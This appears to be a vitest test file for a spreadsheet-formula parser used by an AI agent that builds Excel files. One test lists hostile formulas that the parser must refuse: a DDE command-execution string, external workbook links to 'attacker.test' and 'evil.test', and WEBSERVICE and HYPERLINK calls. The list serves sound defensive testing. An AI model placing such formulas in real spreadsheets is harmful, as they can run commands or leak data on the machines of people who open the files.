import { describe, expect, it } from "vitest";
import { type FormulaSheet, parseFormula, resolveFormulas } from "./formula.js";
import { makeFile } from "./make.js";

const sheet = (
  name: string,
  rows: unknown[][],
  more: Partial<FormulaSheet> = {},
): FormulaSheet => ({
  name,
  final: name,
  dropped: 0,
  rows,
  ...more,
});
const one = (rows: unknown[][]) => resolveFormulas([sheet("S", rows)])[0];

describe("formulas in a workbook an agent makes", () => {
  it("works out sums, differences and ratios, across cells and sheets", () => {
    const [data, summary] = resolveFormulas([
      sheet("Data", [
        ["Line", "Budget", "Actual", "Variance", "Var %"],
        ["Income", 2115, 2183.8, "=C2-B2", "=ROUND(D2/B2,3)"],
        ["Costs", 708, 727, "=C3-B3", "=D3/B3"],
        ["Total", "=SUM(B2:B3)", "=sum( C2:C3 )", "=C4-B4", "=D4/B4"],
      ]),
      sheet("Summary", [
        ["Total actual", "=Data!C4"],
        ["Mean", "=AVERAGE('Data'!B2:B3)"],
      ]),
    ]);
    expect(data?.rows[3]).toEqual(["Total", 2823, 2910.8, 87.8, expect.closeTo(0.0311, 4)]);
    expect(data?.rows[1]?.[4]).toBe(0.033);
    // No trace of how a computer counts: 2183.8 - 2115 is 68.8.
    expect(data?.rows[1]?.[3]).toBe(68.8);
    expect(summary?.rows).toEqual([
      ["Total actual", 2910.8],
      ["Mean", 1411.5],
    ]);
    // Written from what was understood: upper case, no stray spaces.
    expect(data?.formulas.map((cell) => cell.formula)).toEqual([
      "C2-B2",
      "ROUND(D2/B2,3)",
      "C3-B3",
      "D3/B3",
      "SUM(B2:B3)",
      "SUM(C2:C3)",
      "C4-B4",
      "D4/B4",
    ]);
    expect(summary?.formulas.map((cell) => cell.formula)).toEqual([
      "'Data'!C4",
      "AVERAGE('Data'!B2:B3)",
    ]);
  });

  it("shows what Excel shows, and rounds and counts as Excel does", () => {
    const worked = one([
      ["a", 0, "=B1/B1", "=A1+1", "=E1", "=SUM(A1:B1)", "=COUNT(A1,B1,Z9)", "=MIN(5,Z9)"],
      [
        "=ROUND(-2.5,0)",
        "=ROUND(1.005,2)",
        "=ROUND(-0.4,0)",
        "=4200000000123+0",
        "=-(2+3)*2",
        "=2-(3-4)",
        "=8/(4/2)",
        "=12345678901.23+1",
      ],
    ]);
    // Division by nothing; text in arithmetic; a formula that is itself. Over a range, and
    // as an argument, text and empty cells are passed over.
    expect(worked?.rows[0]?.slice(2)).toEqual(["#DIV/0!", "#VALUE!", "#REF!", 0, 1, 5]);
    expect(worked?.rows[1]).toEqual([-3, 1.01, 0, 4200000000123, -10, 3, 4, 12345678902.23]);
    expect(worked?.formulas.filter((cell) => cell.row === 1).map((cell) => cell.formula)).toEqual([
      "ROUND(-2.5,0)",
      "ROUND(1.005,2)",
      "ROUND(-0.4,0)",
      "4200000000123+0",
      "-(2+3)*2",
      "2-(3-4)",
      "8/(4/2)",
      "12345678901.23+1",
    ]);
  });

  it("is only what is allowed: anything else that starts with = stays text and is said", () => {
    for (const text of [
      '=HYPERLINK("http://x.test","x")',
      "=cmd|' /C calc'!A0",
      '="a"&"b"',
      "=WEBSERVICE(A1)",
      "=A1:B2",
      "=A1:B2*1",
      "=ABS(A1:A3)",
      "=SUM(A1",
      "=SUM()",
      "=ROUND(1)",
      "=ROUND(1,2,3)",
      "=ABS()",
      "=1+",
      "=[other.xlsx]Sheet1!A1",
      "=IF(A1>0,1,2)",
      "=A1*5%",
      "=2^3",
      "=XFE1",
      "=A2000000",
      // A sheet's name may not be a path, a workbook, a span of sheets or a call out.
      "='\\\\attacker.test\\s\\[b.xlsx]Sheet1'!A1",
      "='http://evil.test/[x.xlsx]Sheet1'!A1",
      "='C:\\x\\[b.xlsx]S'!A1",
      "='Sheet1:Sheet3'!A1",
      "='cmd|/c calc'!A1",
      "='a!b'!A1",
    ])
      expect(parseFormula(text), text).toBeNull();
    for (const text of [
      "=SUM(B2:B9)",
      "=-(A1+B1)*2/3",
      "=round(c5 / b5, 2)",
      "='My sheet'!$C$4",
      "=SUM(数据!B2:B9)",
    ])
      expect(parseFormula(text), text).not.toBeNull();
    // A sheet that is not in the workbook is not a formula either: it would be a broken link.
    const worked = one([[1, "=Nowhere!A1", "=IF(A1>0,1,2)", "=A1+1"]]);
    expect(worked?.rows[0]).toEqual([1, "=Nowhere!A1", "=IF(A1>0,1,2)", 2]);
    expect(worked?.refused.map((cell) => cell.text)).toEqual(["=Nowhere!A1", "=IF(A1>0,1,2)"]);
  });

  it("names a sheet as the file names it, and counts rows from the header the file begins at", () => {
    const [detail, total] = resolveFormulas([
      sheet(
        "Regional breakdown by quarter 2026",
        [
          ["Line", "Value"],
          ["a", 5],
        ],
        { final: "Regional breakdown by quarter 2" },
      ),
      // The agent wrote a title line above the header; the file begins at the header.
      sheet(
        "Total",
        [
          ["Line", "Budget", "Actual", "Var"],
          ["Income", 10, 12, "=C3-B3"],
          ["Costs", 5, 7, "=C4-B4"],
          ["Total", "=SUM(B3:B4)", "=SUM(C3:C4)", "=D3+D4"],
          ["From detail", "='Regional breakdown by quarter 2026'!B2", "", ""],
        ],
        { dropped: 1 },
      ),
    ]);
    expect(detail?.formulas).toEqual([]);
    expect(total?.rows.slice(1).map((row) => row[3])).toEqual([2, 2, 4, ""]);
    expect(total?.rows[3]?.slice(1, 3)).toEqual([15, 19]);
    expect(total?.formulas.map((cell) => cell.formula)).toEqual([
      "C2-B2",
      "C3-B3",
      "SUM(B2:B3)",
      "SUM(C2:C3)",
      "D2+D3",
      "'Regional breakdown by quarter 2'!B2",
    ]);
    expect(total?.rows[4]?.[1]).toBe(5);
  });

  it("gives a long chain an error, not a crash", () => {
    const rows = Array.from({ length: 3000 }, (_, r) => [r === 2999 ? 1 : `=A${r + 2}+1`]);
    const worked = one(rows);
    expect(worked?.formulas).toHaveLength(2999);
    expect(worked?.rows[2998]?.[0]).toBe(2);
    expect(worked?.rows[0]?.[0]).toBe("#REF!");
    // A running total down 2,500 rows, as the agent is asked to write them, is worked out.
    const running = one(Array.from({ length: 2500 }, (_, r) => [r + 1, `=SUM(A$1:A${r + 1})`]));
    expect(running?.rows[2499]?.[1]).toBe(3126250);
  });

  it("is in the file as a formula with its result, dressed as the figure it shows", async () => {
    const left: string[] = [];
    const bytes = await makeFile(
      "Pack.xlsx",
      "spreadsheet",
      {
        sheets: [
          {
            name: "Variance",
            rows: [
              ["Q3 budget against actual"],
              ["Line", "Budget", "Actual", "Variance", "Var %"],
              ["Income", 2115000, 2183800, "=C3-B3", "=D3/B3"],
              ["Costs", 708000, 727000, "=C4-B4", "=D4/B4"],
              ["Total", "=SUM(B3:B4)", "=SUM(C3:C4)", "=SUM(D3:D4)", "=D5/B5"],
              ["Note", '=HYPERLINK("http://x.test","x")', "", "", ""],
            ],
          },
        ],
      },
      left,
    );
    const { default: ExcelJS } = await import("exceljs");
    const book = new ExcelJS.Workbook();
    await book.xlsx.load(bytes.buffer as ArrayBuffer);
    const page = book.getWorksheet("Variance");
    // The title line is gone, so the total is on row 4 and adds rows 2 and 3.
    expect(page?.getCell("B4").value).toMatchObject({ formula: "SUM(B2:B3)", result: 2823000 });
    expect(page?.getCell("D2").value).toMatchObject({ formula: "C2-B2", result: 68800 });
    // A large figure has its separators, and a share its percent, formula or not.
    expect(page?.getCell("B4").numFmt).toBe("#,##0");
    expect(page?.getCell("E2").numFmt).toBe("0.0%");
    expect(Number(page?.getColumn(4).width)).toBeLessThan(19);
    // Not a formula of the kind allowed: kept as the text it is, and the agent is told.
    expect(page?.getCell("B5").value).toBe('=HYPERLINK("http://x.test","x")');
    // Named as the agent counted it: with its title line.
    expect(left.join(" ")).toContain("Variance B6");
  });
});
